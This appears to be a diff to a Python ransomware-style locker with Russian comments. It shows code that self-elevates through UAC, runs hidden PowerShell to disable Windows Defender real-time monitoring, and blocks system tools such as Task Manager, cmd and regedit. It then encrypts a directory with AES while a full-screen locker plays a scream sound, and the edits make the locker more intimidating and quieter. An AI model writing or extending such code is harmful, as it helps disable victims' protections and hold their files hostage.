@@ -8,6 +8,7 @@ import subprocess
 import psutil
 import keyboard
 import tkinter as tk
+import winsound
 from PIL import Image, ImageTk
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -20,13 +21,13 @@ BLOKC_EXE = ["notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHac
 # ================= ОБХОД UAC И АНТИВИРУСА =================
 def elevate_and_evade():
     if not ctypes.windll.shell32.IsUserAnAdmin():
-        # Прямой вызов UAC (проще и надежнее, чем schtasks)
+        # Запуск от админа (UAC)
         ctypes.windll.shell32.ShellExecuteW(
             None, "runas", sys.executable, " ".join(sys.argv), None, 1
         )
         sys.exit(0)
 
-    # Если мы уже админ, отключаем Defender
+    # Если мы уже админ, отключаем Defender и добавляем исключение
     try:
         subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", 
                         "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;"
@@ -61,7 +62,6 @@ def encrypt_directory():
     key_path = os.path.join(base_dir, "system_key.dat")
 
     if not os.path.exists(target_dir):
-        print("TestFolder not found, skipping encryption.")
         return
         
     key = os.urandom(32)
@@ -175,6 +175,15 @@ def main():
         for widget in win.winfo_children():
             widget.destroy()
             
+        # Звук при запуске локера
+        try:
+            sound_path = resource_path("scream.mp3")
+            if os.path.exists(sound_path):
+                winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
+        except Exception as e:
+            print(f"Sound error: {e}")
+
+        # Запуск шифрования
         threading.Thread(target=encrypt_directory, daemon=True).start()
 
         try:
